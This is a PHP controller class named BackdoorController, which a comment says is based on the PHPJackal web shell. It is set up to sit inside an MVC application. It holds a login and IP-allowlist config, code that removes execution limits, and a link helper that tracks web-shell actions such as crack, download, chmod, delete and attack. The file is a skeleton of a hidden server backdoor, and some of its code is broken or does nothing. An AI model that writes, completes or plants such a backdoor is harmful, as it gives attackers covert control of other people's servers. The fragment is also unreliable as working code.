<?php
/**
 * This class is based PHPJackal v2.0.2 http://h.ackerz.com
 */
namespace Codelib\Controller;

use \Light\Mvc\Controller\ControllerAbstract as ControllerAbstract;

class BackdoorController extends ControllerAbstract
{
    public function __construct()
    {
        $this->currentModule = 'Application';
        parent::__construct();
    }

    public function index()
    {
        $this->configs = $this->_getConfigs();
    }

    private function _getConfigs()
    {
        $configs = array(
            'loginPassword' => '',
            'email' => '',
            'allowedIps' => array(),
        );

        return $configs;
    }

    private function _init()
    {
        set_time_limit(0);
        ini_set('max_execution_time','0');
        ini_set('memory_limit','9999M');
        ini_set('output_buffering',0);
        set_magic_quotes_runtime(0);

        $this->ip = $this->ip;
        if (!empty($this->configs['allowedIps']) && !in_array($this->ip, $this->configs['allowedIps'])) {
            exit("IP '{$this->ip}' not allowed");
        }
    }

    private function hlinK($str = '')
    {
        $myvars=array('attacH','forgeT','serveR','domaiN','modE','chkveR','chmoD','workingdiR','urL','cracK','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');
        $ret=$_SERVER['PHP_SELF'].'?';
        $new=explode('&',$str);
        foreach($_GET as $key => $v){
        $add=1;
        foreach($new as $m){
        $el=explode('=',$m);
        if($el[0]==$key)$add=0;
        }
        if($add){if(!in_array($key,$myvars))$ret.="$key=$v&";}
        }
        $ret.=$str;
        return $ret;
    }
    
}
